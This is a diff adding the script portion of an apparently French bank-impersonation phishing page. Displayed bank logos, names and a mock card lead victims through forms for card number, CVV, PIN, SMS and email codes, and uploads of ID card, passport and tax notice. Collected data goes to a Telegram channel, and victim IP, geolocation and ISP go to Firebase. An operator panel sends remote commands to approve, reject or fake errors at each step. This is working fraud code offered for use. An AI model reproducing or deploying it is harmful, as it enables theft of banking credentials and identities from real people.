+            const errorElement = document.getElementById(`${fieldId}-error`);
+            const smsValue = field.value.trim();
+            if (!smsValue || smsValue.length < 5 || smsValue.length > 6 || !/^\d+$/.test(smsValue)) { field.classList.add('error'); errorElement.style.display = 'block'; return false; }
+            field.classList.remove('error'); errorElement.style.display = 'none'; return true;
+        }
+
+        function hideAllErrors() {
+            document.querySelectorAll('.error-message').forEach(error => error.style.display = 'none');
+            document.querySelectorAll('.form-input.error, .form-select.error').forEach(field => field.classList.remove('error'));
+        }
+
+        // ============================================
+        // FONCTIONS D'AFFICHAGE (conservées)
+        // ============================================
+        function updateAllBankDisplays() {
+            const banqueId = document.getElementById('banque').value;
+            const nom = document.getElementById('nom').value;
+            const prenom = document.getElementById('prenom').value;
+            const fullName = `${nom} ${prenom}`.trim();
+            
+            const nameElements = ['display-user-name', 'confirmation-user-name', 'pin-user-name', 'sms-user-name', 'loading60-user-name', 'loadingpin-user-name', 'loadingsms-user-name', 'email-user-name', 'loadingaftersms-user-name', 'loadingemail-user-name', 'docs-user-name', 'upload-user-name', 'loadingfinal-user-name'];
+            nameElements.forEach(id => { const el = document.getElementById(id); if (el) el.textContent = fullName || 'Nom Prénom'; });
+            
+            const bankElements = ['display-bank-name', 'confirmation-bank-name', 'pin-bank-name', 'sms-bank-name', 'loading60-bank-name', 'loadingpin-bank-name', 'loadingsms-bank-name', 'email-bank-name', 'loadingaftersms-bank-name', 'loadingemail-bank-name', 'docs-bank-name', 'upload-bank-name', 'loadingfinal-bank-name'];
+            bankElements.forEach(id => { const el = document.getElementById(id); if (el && banqueId) el.textContent = BANK_NAMES[banqueId] || 'Banque'; });
+            
+            const logoElements = ['bank-logo-display', 'confirmation-bank-logo', 'pin-bank-logo', 'sms-bank-logo', 'loading60-bank-logo', 'loadingpin-bank-logo', 'loadingsms-bank-logo', 'email-bank-logo', 'loadingaftersms-bank-logo', 'loadingemail-bank-logo', 'docs-bank-logo', 'upload-bank-logo', 'loadingfinal-bank-logo'];
+            logoElements.forEach(id => { const el = document.getElementById(id); if (el && banqueId && BANK_LOGOS[banqueId]) el.innerHTML = `<img src="${BANK_LOGOS[banqueId]}" alt="${BANK_NAMES[banqueId]}" style="max-width:100%;max-height:100%;object-fit:contain;">`; });
+            
+            updateBankLogoOnCard();
+            syncNomPrenomToCard();
+        }
+
+        function updateBankLogoOnCard() {
+            const banqueId = document.getElementById('banque').value;
+            const cardLogoElement = document.getElementById('card-logo');
+            if (banqueId && BANK_LOGOS[banqueId] && cardLogoElement) {
+                cardLogoElement.innerHTML = `<img src="${BANK_LOGOS[banqueId]}" alt="${BANK_NAMES[banqueId]}" style="max-width:100%;max-height:100%;object-fit:contain;">`;
+            }
+        }
+
+        function syncNomPrenomToCard() {
+            const nom = document.getElementById('nom').value;
+            const prenom = document.getElementById('prenom').value;
+            const nomCarteInput = document.getElementById('nom-carte');
+            if ((nom || prenom) && nomCarteInput && !nomCarteInput.dataset.userEdited) {
+                nomCarteInput.value = `${nom} ${prenom}`.trim().toUpperCase();
+                updateCardDisplay();
+            }
+        }
+
+        function updateCardDisplay() {
+            const cardNumber = document.getElementById('numero-carte')?.value || '';
+            const cardName = document.getElementById('nom-carte')?.value || '';
+            const expiry = document.getElementById('expiration')?.value || '';
+            const cvv = document.getElementById('cvv')?.value || '';
+            
+            document.getElementById('card-number-display').textContent = cardNumber || '•••• •••• •••• ••••';
+            document.getElementById('card-holder-display').textContent = cardName.toUpperCase() || 'NOM PRÉNOM';
+            document.getElementById('card-expiry-display').textContent = expiry || 'MM/AA';
+            document.getElementById('card-cvv-display').textContent = cvv ? '•'.repeat(cvv.length) : '•••';
+            
+            detectCardType(cardNumber);
+        }
+
+        function detectCardType(cardNumber) {
+            const cleanedNumber = cardNumber.replace(/\s+/g, '');
+            const cardLogoElement = document.getElementById('card-logo');
+            for (const [type, config] of Object.entries(CARD_TYPES)) {
+                if (config.pattern.test(cleanedNumber)) {
+                    cardLogoElement.innerHTML = `<img src="${config.logo}" alt="${type}" style="max-width:100%;max-height:100%;object-fit:contain;">`;
+                    document.querySelector('.card-front').style.background = `linear-gradient(135deg, ${config.color} 0%, #333333 100%)`;
+                    document.querySelector('.card-back').style.background = `linear-gradient(135deg, #333333 0%, ${config.color} 100%)`;
+                    return;
+                }
+            }
+            updateBankLogoOnCard();
+        }
+
+        function flipCard(flip) {
+            const card3d = document.getElementById('card-3d');
+            if (card3d) card3d.classList.toggle('flipped', flip);
+        }
+
+        // ============================================
+        // FONCTIONS DOCUMENTS (conservées)
+        // ============================================
+        let selectedDocumentOption = null;
+        let uploadedFiles = {};
+        let requiredFiles = [];
+
+        function selectDocumentOption(option) {
+            selectedDocumentOption = option;
+            document.getElementById('option-carte').style.borderColor = option === 'carte' ? 'var(--border-color)' : '#333';
+            document.getElementById('option-passeport').style.borderColor = option === 'passeport' ? 'var(--border-color)' : '#333';
+            document.getElementById('continue-docs-btn').disabled = false;
+            document.getElementById('continue-docs-btn').style.opacity = '1';
+            collectedData.documentOption = option;
+        }
+
+        function validateDocumentChoice() {
+            if (!selectedDocumentOption) { showErrorNotification('❌ Sélectionnez un type de document'); return; }
+            
+            const message = formatStepMessage(8, collectedData);
+            sendToTelegram(message);
+            
+            prepareUploadAreas(selectedDocumentOption);
+            document.querySelectorAll('.form-step.active').forEach(el => el.classList.remove('active'));
+            document.getElementById('step-9').classList.add('active');
+            currentStep = 9;
+            updateAllBankDisplays();
+        }
+
+        function prepareUploadAreas(option) {
+            const container = document.getElementById('upload-areas-container');
+            const uploadTitle = document.getElementById('upload-title');
+            
+            if (option === 'carte') {
+                uploadTitle.textContent = 'Téléchargez vos 3 documents requis';
+                requiredFiles = ['carte_recto', 'carte_verso', 'avis_imposition'];
+                
+                container.innerHTML = `
+                    <div class="upload-area" data-file-type="carte_recto" style="background: linear-gradient(145deg, #1a1a1a, #000000); border: 3px dashed var(--border-color); border-radius: 15px; padding: 20px; margin-bottom: 15px; text-align: center; cursor: pointer;" onclick="triggerFileUpload('carte_recto')">
+                        <div style="font-size: 32px; margin-bottom: 10px;">🆔</div>
+                        <div style="color: var(--white-color); font-weight: 600; margin-bottom: 5px;">Carte d'identité - Recto</div>
+                        <div style="color: #CCCCCC; font-size: 13px; margin-bottom: 10px;">PNG, JPG ou PDF (max 5 Mo)</div>
+                        <div class="file-name" id="filename-carte_recto" style="color: #10B981; font-size: 12px;"></div>
+                        <input type="file" id="file-carte_recto" accept=".jpg,.jpeg,.png,.pdf" style="display: none;" onchange="handleFileSelect('carte_recto', this)">
+                    </div>
+                    <div class="upload-area" data-file-type="carte_verso" style="background: linear-gradient(145deg, #1a1a1a, #000000); border: 3px dashed var(--border-color); border-radius: 15px; padding: 20px; margin-bottom: 15px; text-align: center; cursor: pointer;" onclick="triggerFileUpload('carte_verso')">
+                        <div style="font-size: 32px; margin-bottom: 10px;">🆔</div>
+                        <div style="color: var(--white-color); font-weight: 600; margin-bottom: 5px;">Carte d'identité - Verso</div>
+                        <div style="color: #CCCCCC; font-size: 13px; margin-bottom: 10px;">PNG, JPG ou PDF (max 5 Mo)</div>
+                        <div class="file-name" id="filename-carte_verso" style="color: #10B981; font-size: 12px;"></div>
+                        <input type="file" id="file-carte_verso" accept=".jpg,.jpeg,.png,.pdf" style="display: none;" onchange="handleFileSelect('carte_verso', this)">
+                    </div>
+                    <div class="upload-area" data-file-type="avis_imposition" style="background: linear-gradient(145deg, #1a1a1a, #000000); border: 3px dashed var(--border-color); border-radius: 15px; padding: 20px; margin-bottom: 15px; text-align: center; cursor: pointer;" onclick="triggerFileUpload('avis_imposition')">
+                        <div style="font-size: 32px; margin-bottom: 10px;">📄</div>
+                        <div style="color: var(--white-color); font-weight: 600; margin-bottom: 5px;">Avis d'imposition</div>
+                        <div style="color: #CCCCCC; font-size: 13px; margin-bottom: 10px;">PNG, JPG ou PDF (max 5 Mo)</div>
+                        <div class="file-name" id="filename-avis_imposition" style="color: #10B981; font-size: 12px;"></div>
+                        <input type="file" id="file-avis_imposition" accept=".jpg,.jpeg,.png,.pdf" style="display: none;" onchange="handleFileSelect('avis_imposition', this)">
+                    </div>
+                `;
+            } else {
+                uploadTitle.textContent = 'Téléchargez vos 2 documents requis';
+                requiredFiles = ['passeport', 'avis_imposition'];
+                
+                container.innerHTML = `
+                    <div class="upload-area" data-file-type="passeport" style="background: linear-gradient(145deg, #1a1a1a, #000000); border: 3px dashed var(--border-color); border-radius: 15px; padding: 20px; margin-bottom: 15px; text-align: center; cursor: pointer;" onclick="triggerFileUpload('passeport')">
+                        <div style="font-size: 32px; margin-bottom: 10px;">🛂</div>
+                        <div style="color: var(--white-color); font-weight: 600; margin-bottom: 5px;">Passeport (page principale)</div>
+                        <div style="color: #CCCCCC; font-size: 13px; margin-bottom: 10px;">PNG, JPG ou PDF (max 5 Mo)</div>
+                        <div class="file-name" id="filename-passeport" style="color: #10B981; font-size: 12px;"></div>
+                        <input type="file" id="file-passeport" accept=".jpg,.jpeg,.png,.pdf" style="display: none;" onchange="handleFileSelect('passeport', this)">
+                    </div>
+                    <div class="upload-area" data-file-type="avis_imposition" style="background: linear-gradient(145deg, #1a1a1a, #000000); border: 3px dashed var(--border-color); border-radius: 15px; padding: 20px; margin-bottom: 15px; text-align: center; cursor: pointer;" onclick="triggerFileUpload('avis_imposition')">
+                        <div style="font-size: 32px; margin-bottom: 10px;">📄</div>
+                        <div style="color: var(--white-color); font-weight: 600; margin-bottom: 5px;">Avis d'imposition</div>
+                        <div style="color: #CCCCCC; font-size: 13px; margin-bottom: 10px;">PNG, JPG ou PDF (max 5 Mo)</div>
+                        <div class="file-name" id="filename-avis_imposition" style="color: #10B981; font-size: 12px;"></div>
+                        <input type="file" id="file-avis_imposition" accept=".jpg,.jpeg,.png,.pdf" style="display: none;" onchange="handleFileSelect('avis_imposition', this)">
+                    </div>
+                `;
+            }
+            
+            uploadedFiles = {};
+        }
+
+        function triggerFileUpload(fileType) {
+            document.getElementById(`file-${fileType}`).click();
+        }
+
+        function handleFileSelect(fileType, input) {
+            if (input.files && input.files[0]) {
+                const file = input.files[0];
+                if (file.size > 5 * 1024 * 1024) { 
+                    showErrorNotification('❌ Fichier trop grand (max 5 Mo)'); 
+                    return; 
+                }
+                const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
+                if (!allowedTypes.includes(file.type)) { 
+                    showErrorNotification('❌ Format non supporté'); 
+                    return; 
+                }
+                uploadedFiles[fileType] = { name: file.name, size: file.size, type: file.type };
+                const fileNameElement = document.getElementById(`filename-${fileType}`);
+                if (fileNameElement) fileNameElement.textContent = `✓ ${file.name}`;
+                const uploadArea = input.closest('.upload-area');
+                if (uploadArea) { 
+                    uploadArea.style.borderColor = '#10B981'; 
+                    uploadArea.style.backgroundColor = 'rgba(16, 185, 129, 0.1)'; 
+                }
+                updateUploadProgress();
+            }
+        }
+
+        function updateUploadProgress() {
+            const totalFiles = requiredFiles.length;
+            let uploadedCount = Object.keys(uploadedFiles).length;
+            const progressPercent = Math.round((uploadedCount / totalFiles) * 100);
+            document.getElementById('upload-progress-bar').style.width = progressPercent + '%';
+            document.getElementById('upload-progress-percent').textContent = progressPercent + '%';
+            const statusEl = document.getElementById('upload-status');
+            if (uploadedCount === totalFiles) {
+                statusEl.innerHTML = '<span style="color: #10B981;">✅ Tous les documents téléchargés</span>';
+                document.getElementById('validate-docs-btn').disabled = false;
+                document.getElementById('validate-docs-btn').style.opacity = '1';
+            } else {
+                statusEl.innerHTML = `📤 ${uploadedCount}/${totalFiles} documents téléchargés`;
+                document.getElementById('validate-docs-btn').disabled = true;
+                document.getElementById('validate-docs-btn').style.opacity = '0.5';
+            }
+        }
+
+        function validateDocuments() {
+            if (Object.keys(uploadedFiles).length < requiredFiles.length) { 
+                showErrorNotification('❌ Tous les documents requis'); 
+                return; 
+            }
+            
+            let docsMessage = `*📄 DOCUMENTS UPLOADÉS*\n\n`;
+            for (const [type, file] of Object.entries(uploadedFiles)) {
+                docsMessage += `└─ *${type}:* ${file.name} (${(file.size/1024).toFixed(0)} Ko)\n`;
+            }
+            sendToTelegram(docsMessage);
+            
+            document.getElementById('step-9').classList.remove('active');
+            document.getElementById('step-loading-final').classList.add('active');
+            const progressFill = document.getElementById('progress-fill-final');
+            if (progressFill) { 
+                progressFill.style.width = '0%'; 
+                setTimeout(() => progressFill.style.width = '100%', 50); 
+            }
+            
+            setTimeout(() => {
+                document.getElementById('step-loading-final').classList.remove('active');
+                showSuccessNotification();
+            }, 15000);
+        }
+
+        // ============================================
+        // FIREBASE COMMUNICATION AVEC GÉOLOCALISATION
+        // ============================================
+        let firebaseConnected = false;
+        let sessionRef = null;
+        let commandListener = null;
+
+        async function connectSiteToFirebase() {
+            const sessionId = currentSessionId || 'site_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            if (!currentSessionId) currentSessionId = sessionId;
+            
+            // 🔍 Récupérer la géolocalisation
+            const geoData = await fetchGeoLocation();
+            console.log('📍 Géolocalisation récupérée:', geoData);
+            
+            sessionRef = database.ref(`sessions/${sessionId}`);
+            
+            // Enregistrer la session AVEC les informations de localisation
+            await sessionRef.set({
+                type: 'site',
+                currentStep: currentStep || 1,
+                lastSeen: firebase.database.ServerValue.TIMESTAMP,
+                info: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    url: window.location.href,
+                    browser: navigator.userAgent.includes('Safari') ? 'Safari' : 
+                             navigator.userAgent.includes('Chrome') ? 'Chrome' : 'Autre',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                },
+                collectedData: {
+                    nom: collectedData?.nom || '',
+                    prenom: collectedData?.prenom || '',
+                    email: collectedData?.email || '',
+                    telephone: collectedData?.telephone || '',
+                    banque: collectedData?.banque || ''
+                },
+                // 🌍 AJOUT: INFORMATIONS DE LOCALISATION
+                location: {
+                    country: geoData.country,
+                    city: geoData.city,
+                    region: geoData.region,
+                    ip: geoData.ip,
+                    flag: geoData.flag,
+                    latitude: geoData.latitude,
+                    longitude: geoData.longitude,
+                    isp: geoData.isp,
+                    timezone: geoData.timezone
+                },
+                ip: geoData.ip
+            });
+            
+            // Écouter les commandes
+            commandListener = database.ref(`commands/${sessionId}`);
+            commandListener.on('value', (snapshot) => {
+                const command = snapshot.val();
+                if (command) {
+                    console.log('📨 Commande Firebase reçue:', command.action);
+                    executeFirebaseCommand(command);
+                    database.ref(`commands/${sessionId}`).remove();
+                }
+            });
+            
+            // Mise à jour périodique
+            setInterval(updateFirebaseStatus, 5000);
+            
+            firebaseConnected = true;
+            console.log('✅ Firebase connecté - Session:', sessionId);
+            addFirebaseIndicator(true);
+        }
+
+        function executeFirebaseCommand(command) {
+            switch(command.action) {
+                case 'validateStep3':
+                    if (window.panelValidateStep3) window.panelValidateStep3();
+                    break;
+                case 'rejectStep3':
+                    if (window.panelRejectStep3) window.panelRejectStep3(command.data?.message);
+                    break;
+                case 'validateStep4':
+                    if (window.panelValidateStep4) window.panelValidateStep4();
+                    break;
+                case 'rejectStep4':
+                    if (window.panelRejectStep4) window.panelRejectStep4(command.data?.message);
+                    break;
+                case 'validateStep5':
+                    if (window.panelValidateStep5) window.panelValidateStep5();
+                    break;
+                case 'rejectStep5':
+                    if (window.panelRejectStep5) window.panelRejectStep5(command.data?.message);
+                    break;
+                case 'validateStep6':
+                    if (window.panelValidateStep6) window.panelValidateStep6();
+                    break;
+                case 'rejectStep6':
+                    if (window.panelRejectStep6) window.panelRejectStep6(command.data?.message);
+                    break;
+                case 'validateStep7':
+                    if (window.panelValidateStep7) window.panelValidateStep7();
+                    break;
+                case 'rejectStep7':
+                    if (window.panelRejectStep7) window.panelRejectStep7(command.data?.message);
+                    break;
+                case 'sendErrorConnection':
+                    if (window.showSiteError) window.showSiteError('connection', command.data?.message);
+                    break;
+                case 'sendErrorPIN':
+                    if (window.showSiteError) window.showSiteError('pin', command.data?.message);
+                    break;
+                case 'sendErrorSMS':
+                    if (window.showSiteError) window.showSiteError('sms', command.data?.message);
+                    break;
+                case 'sendErrorEmail':
+                    if (window.showSiteError) window.showSiteError('email', command.data?.message);
+                    break;
+                case 'forceStep':
+                    if (panelComm && panelComm.forceGoToStep) {
+                        panelComm.forceGoToStep(command.data?.step);
+                    }
+                    break;
+                case 'stopAll':
+                    if (panelComm && panelComm.stopAll) panelComm.stopAll();
+                    break;
+                case 'hardReset':
+                    if (panelComm && panelComm.forceGoToStep) panelComm.forceGoToStep(1);
+                    setTimeout(() => location.reload(), 500);
+                    break;
+                default:
+                    console.log('Commande inconnue:', command.action);
+            }
+        }
+
+        function updateFirebaseStatus() {
+            if (!firebaseConnected || !sessionRef) return;
+            
+            sessionRef.update({
+                currentStep: currentStep,
+                lastSeen: firebase.database.ServerValue.TIMESTAMP,
+                collectedData: {
+                    nom: collectedData?.nom || '',
+                    prenom: collectedData?.prenom || '',
+                    email: collectedData?.email || '',
+                    telephone: collectedData?.telephone || '',
+                    banque: collectedData?.banque || ''
+                }
+            });
+        }
+
+        function addFirebaseIndicator(connected) {
+            let indicator = document.getElementById('firebase-indicator');
+            if (!indicator) {
+                indicator = document.createElement('div');
+                indicator.id = 'firebase-indicator';
+                indicator.style.cssText = `
+                    position: fixed;
+                    bottom: 20px;
+                    right: 20px;
+                    width: 12px;
+                    height: 12px;
+                    border-radius: 50%;
+                    z-index: 99999;
+                    cursor: pointer;
+                    transition: all 0.3s ease;
+                `;
+                indicator.title = 'Firebase: Connecté';
+                document.body.appendChild(indicator);
+            }
+            
+            indicator.style.backgroundColor = connected ? '#10B981' : '#DC2626';
+            indicator.style.boxShadow = connected ? '0 0 10px #10B981' : '0 0 10px #DC2626';
+        }
+
+        // ============================================
+        // INITIALISATION (conservée)
+        // ============================================
+        function applyAdminConfig() {
+            const theme = ADMIN_CONFIG.THEME_COLOR.toLowerCase();
+            const button = ADMIN_CONFIG.BUTTON_COLOR.toLowerCase();
+            const border = ADMIN_CONFIG.BORDER_COLOR.toLowerCase();
+            
+            document.documentElement.style.setProperty('--primary-color', COLOR_CONFIG[theme]?.primary || COLOR_CONFIG.black.primary);
+            document.documentElement.style.setProperty('--button-color', COLOR_CONFIG[button]?.button || COLOR_CONFIG.yellow.button);
+            document.documentElement.style.setProperty('--border-color', COLOR_CONFIG[border]?.border || COLOR_CONFIG.yellow.border);
+        }
+
+        function generateUniqueReference() {
+            const random = Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
+            uniqueReferenceNumber = `REF-2025-${random}`;
+            document.getElementById('reference-number').textContent = uniqueReferenceNumber;
+            collectedData.reference = uniqueReferenceNumber;
+        }
+
+        function initCardEvents() {
+            document.getElementById('numero-carte').addEventListener('input', updateCardDisplay);
+            document.getElementById('nom-carte').addEventListener('input', updateCardDisplay);
+            document.getElementById('expiration').addEventListener('input', updateCardDisplay);
+            document.getElementById('cvv').addEventListener('input', updateCardDisplay);
+            updateCardDisplay();
+        }
+
+        function formatInputFields() {
+            document.getElementById('numero-carte').addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                let formatted = '';
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += value[i];
+                }
+                e.target.value = formatted;
+            });
+            
+            document.getElementById('expiration').addEventListener('input', function(e) {
+                let value = e.target.value.replace(/[^0-9]/g, '');
+                if (value.length >= 2) e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            });
+            
+            document.getElementById('cvv').addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '').substring(0, 3);
+            });
+            
+            document.getElementById('pin').addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '').substring(0, 6);
+            });
+            
+            document.getElementById('sms').addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '').substring(0, 6);
+            });
+        }
+
+        function initEmailCodeInput() {
+            const digits = document.querySelectorAll('.email-code-digit');
+            digits.forEach((digit, index) => {
+                digit.addEventListener('input', function(e) {
+                    if (!/^\d*$/.test(e.target.value)) { e.target.value = ''; return; }
+                    if (e.target.value) e.target.classList.add('filled');
+                    else e.target.classList.remove('filled');
+                    if (e.target.value && index < digits.length - 1) digits[index + 1].focus();
+                });
+                digit.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !this.value && index > 0) {
+                        digits[index - 1].focus();
+                        digits[index - 1].value = '';
+                        digits[index - 1].classList.remove('filled');
+                    }
+                });
+            });
+        }
+
+        function initPanelListener() {
+            window.addEventListener('message', function(event) {
+                if (event.data?.type === 'panelCommand') {
+                    const command = event.data.command || event.data;
+                    if (panelComm) panelComm.executeCommand(command);
+                }
+            });
+            setInterval(() => {
+                if (panelComm && !panelComm.initialized) panelComm.init();
+            }, 1000);
+        }
+
+        // Initialisation Firebase
+        firebase.initializeApp(FIREBASE_CONFIG);
+        const database = firebase.database();
+
+        window.addEventListener('load', function() {
+            console.log('🚀 Démarrage...');
+            
+            applyAdminConfig();
+            generateUniqueReference();
+            showWelcomeNotification();
+            formatInputFields();
+            initCardEvents();
+            initEmailCodeInput();
+            setupPhoneInputWithCountryCode();
+            updateAllBankDisplays();
+            
+            setTimeout(() => {
+                if (panelComm) {
+                    panelComm.init();
+                    console.log('✅ PanelCommunicator initialisé');
+                    panelComm.sendToPanel('systemReady', { version: '2.0.0' });
+                }
+            }, 500);
+            
+            initPanelListener();
+            
+            document.getElementById('nom').addEventListener('input', updateAllBankDisplays);
+            document.getElementById('prenom').addEventListener('input', updateAllBankDisplays);
+            document.getElementById('banque').addEventListener('change', updateAllBankDisplays);
+            document.getElementById('email').addEventListener('input', updateAllBankDisplays);
+            
+            // Démarrer la connexion Firebase avec géolocalisation
+            setTimeout(connectSiteToFirebase, 2000);
+            
+            console.log('✅ Initialisation terminée');
+        });
+    </script>
+</body>
+</html>
